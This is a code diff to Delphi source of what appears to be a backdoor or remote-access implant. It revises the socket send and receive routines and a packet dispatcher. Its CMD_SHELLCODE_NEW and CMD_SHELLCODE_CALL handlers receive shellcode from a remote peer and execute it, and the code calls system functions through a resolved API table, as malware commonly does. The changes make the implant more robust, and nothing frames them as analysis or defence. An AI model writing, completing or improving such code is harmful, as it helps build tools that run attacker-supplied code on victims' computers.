@@ -29,26 +29,32 @@ end;
 function SendBuffer(pConn:PConnRec; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer; bCompress:Boolean): Boolean;
 var
   lpszSendBuffer: Pointer;
-  szSendBuffer: Array[0..2047] Of WideChar;
+  szSendBuffer: Pointer;
+  pMem:Pointer;
   iSendLen: Integer;
 begin
   Result := False;
-  pConn.pAPI.xZeroMemory(szSendBuffer, SizeOf(szSendBuffer));
-  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
-  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
+  pMem := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
+  if pMem <> nil then
   begin
-    pConn.pAPI.xCopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
+    szSendBuffer := pMem;
+    lpszSendBuffer := Pointer(DWORD(szSendBuffer) + SizeOf(TSocketHeader));
+    if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
+    begin
+      pConn.pAPI.xCopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
+    end;
+    with LPSocketHeader(szSendBuffer)^ do
+    begin
+      dwPacketLen := iBufferLen;
+      bCommand := bySocketCmd;
+    end;
+    Dec(DWORD(lpszSendBuffer));
+    iBufferLen := iBufferLen + SizeOf(TSocketHeader);
+    iSendLen := pConn.xsend(pConn.hWinsock, szSendBuffer^, iBufferLen, 0);
+    if (iSendLen = iBufferLen) then
+      Result := True;
+    pConn.pAPI.xFreeMem(pConn.pAPI, pMem);
   end;
-  with LPSocketHeader(@szSendBuffer)^ do
-  begin
-    dwPacketLen := iBufferLen;
-    bCommand := bySocketCmd;
-  end;
-  Dec(DWORD(lpszSendBuffer));
-  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
-  iSendLen := pConn.xsend(pConn.hWinsock, szSendBuffer, iBufferLen, 0);
-  if (iSendLen = iBufferLen) then
-    Result := True;
 end;
 
 function RecvBuffer(pConn:PConnRec; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
@@ -130,13 +136,12 @@ var
   pShell:PShellCode;
 begin
   case bCommand of
-    CMD_ONLINE: pConn.pAPI.xMessageBoxW(0, pBuffer,nil,0);
     CMD_SHELLCODE_NEW: 
       begin
         pShell := pBuffer;
         AddShellCode(pConn, pShell, @(pShell.pData));
       end;
-    CMD_SHELLCODE_CALL: 
+    CMD_SHELLCODE_CALL:
       begin
         pShell := pBuffer;
         CallShellCode(pConn, pShell);
@@ -170,7 +175,7 @@ begin
         Break;
       end;
       //Parse Packet
-      ParsePacket(pConn, mRecvBuffer, dwBufferLen - 1, pPacketHeader.bCommand);
+      ParsePacket(pConn, mRecvBuffer, iResult, pPacketHeader.bCommand);
     end;
     pConn.pAPI.xFreeMem(pConn.pAPI, mRecvBuffer);
   end;
